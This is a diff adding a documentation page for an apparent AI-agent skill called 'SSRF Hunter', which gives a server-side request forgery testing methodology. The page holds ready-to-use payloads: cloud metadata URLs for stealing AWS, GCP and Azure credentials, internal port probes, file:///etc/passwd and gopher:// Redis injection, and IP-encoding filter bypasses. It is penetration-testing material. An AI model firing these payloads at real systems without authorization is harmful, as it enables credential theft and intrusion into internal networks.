@@ -1,0 +1,159 @@
+---
+title: SSRF Hunter
+description: Complete SSRF detection and exploitation methodology — injection point discovery, cloud metadata theft (AWS/GCP/Azure), internal network enumeration, protocol handler abuse, filter bypass techniques, blind SSRF via OOB, and report structure.
+---
+
+<Info>
+  **Category:** Pentest & security testing
+</Info>
+
+**Installation**
+
+```bash
+auditguard-skills add ssrf-hunter
+```
+
+---
+
+## Summary
+
+Detect and exploit Server-Side Request Forgery from injection point discovery through cloud credential theft and internal network takeover.
+
+- Phase 1 maps all SSRF injection points: obvious URL parameters, less-obvious parameters (PDF renderers, file importers, webhook callbacks), and non-URL parameters that trigger fetches
+- Phase 2 confirms SSRF using OOB callbacks (Burp Collaborator, interactsh) and classifies the result (non-blind vs. blind, filtered vs. full response)
+- Phase 3 exploits cloud metadata endpoints for AWS IMDSv1/v2, GCP, and Azure — stealing IAM credentials, service account tokens, and managed identity tokens
+- Phase 4 enumerates internal network services via SSRF port scanning (Redis, MySQL, MongoDB, Docker API, Kubernetes kubelet)
+- Phase 5 abuses protocol handlers: `file://`, `gopher://`, `dict://` for Redis command injection and SMTP relay
+- Phase 6 covers filter bypass techniques: IP encoding (decimal, hex, octal, IPv6 mapped), localhost aliases, redirect chains, DNS rebinding
+- Includes an automation script and a complete report structure
+
+---
+
+## SKILL.md
+
+### SSRF Hunter
+
+Server-Side Request Forgery occurs when a server fetches a user-controlled URL, allowing attackers to reach internal services, cloud metadata, and resources behind firewalls that are otherwise inaccessible.
+
+#### When to Use This Skill
+
+Use this skill when the user:
+
+- Sees any parameter that accepts a URL, hostname, IP, or path
+- Wants to check if a server fetches external resources
+- Is testing cloud-hosted applications for metadata endpoint access
+- Wants to probe internal services through a compromised SSRF point
+
+#### What Does It Check?
+
+**In scope:**
+- URL parameters: `?url=`, `?proxy=`, `?fetch=`, `?preview=`, `?link=`
+- Non-obvious parameters: PDF/image renderers, file import/export, webhook callbacks, XML `<url>` tags, OAuth redirect parameters
+- Cloud metadata: AWS IMDSv1/v2, GCP, Azure IMDS
+- Internal services: Redis, MySQL, PostgreSQL, MongoDB, Elasticsearch, Docker API, Kubernetes kubelet
+- Protocol handlers: `file://`, `gopher://`, `dict://`, `ftp://`
+- Filter bypass: IP encoding, localhost aliases, redirect chains, DNS rebinding
+
+**Out of scope:**
+- Other vulnerability classes — use dedicated skills for XXE, IDOR, etc.
+
+#### How It Works
+
+**Phase 1: Find Injection Points**
+
+```
+GET /fetch?url=https://example.com
+GET /proxy?target=https://example.com
+POST /webhook { "callback": "https://example.com" }
+```
+
+Also check: `?source=`, `?file=`, `?pdf_url=`, `?screenshot=`, `redirect_uri=`, `X-Forwarded-Host`, `?sitemap=`.
+
+**Phase 2: Confirm SSRF**
+
+```
+GET /fetch?url=https://YOUR-COLLABORATOR-ID.oastify.com
+```
+
+| Response | Interpretation |
+|---|---|
+| 200 + internal content | Non-blind SSRF, confirmed |
+| 502 Bad Gateway | SSRF exists, target got an error |
+| DNS hit, no HTTP | Blind SSRF (DNS only) |
+| Timeout | Firewall blocking outbound |
+
+**Phase 3: Cloud Metadata Exploitation**
+
+```
+# AWS IMDSv1 (no auth)
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP
+GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+Header: Metadata-Flavor: Google
+
+# Azure IMDS
+GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+```
+
+**Phase 4: Internal Network Enumeration**
+
+```
+GET /fetch?url=http://127.0.0.1:6379/   → Redis
+GET /fetch?url=http://127.0.0.1:2375/   → Docker API (unauthenticated)
+GET /fetch?url=http://127.0.0.1:10250/  → Kubernetes kubelet
+```
+
+**Phase 5: Protocol Handler Abuse**
+
+```
+file:///etc/passwd          → Local file read
+gopher://127.0.0.1:6379/_  → Redis command injection
+```
+
+**Phase 6: Filter Bypass**
+
+```
+http://2852039166/           → Decimal IP (169.254.169.254)
+http://0xa9fea9fe/           → Hex IP
+http://[::ffff:169.254.169.254]/  → IPv6 mapped
+http://localhost/  http://127.1/  http://0/  → Localhost aliases
+```
+
+#### Output
+
+| Severity | Condition |
+|---|---|
+| Critical | Cloud metadata accessible — IAM credentials stolen |
+| Critical | Docker/Kubernetes API accessible — unauthenticated RCE possible |
+| High | Internal services accessible (Redis, databases) |
+| High | Local file read via `file://` |
+| Medium | Blind SSRF confirmed — limited internal access |
+
+#### Known Limitations
+
+- AWS IMDSv2 requires token-based authentication — test whether the app forwards custom headers
+- Blind SSRF has limited direct impact but can be escalated via DNS exfiltration or chaining with other bugs
+- DNS rebinding attacks require external tooling (singularity) and specific DNS TTL conditions
+
+---
+
+## Related skills
+
+<CardGroup cols={3}>
+  <Card title="xxe-phantom" href="/skills/xxe-phantom">
+    Complete XXE detection and exploitation methodology — file read, blind OOB, SAML vectors, and SSRF chaining
+
+    
+  </Card>
+  <Card title="redirect-forge" href="/skills/redirect-forge">
+    Complete open redirect methodology — SSRF chaining, OAuth token theft, and bypass techniques
+
+    
+  </Card>
+  <Card title="hpp-hunter" href="/skills/hpp-hunter">
+    Complete HTTP Parameter Pollution methodology — includes SSRF via HPP scenarios
+
+    
+  </Card>
+</CardGroup>
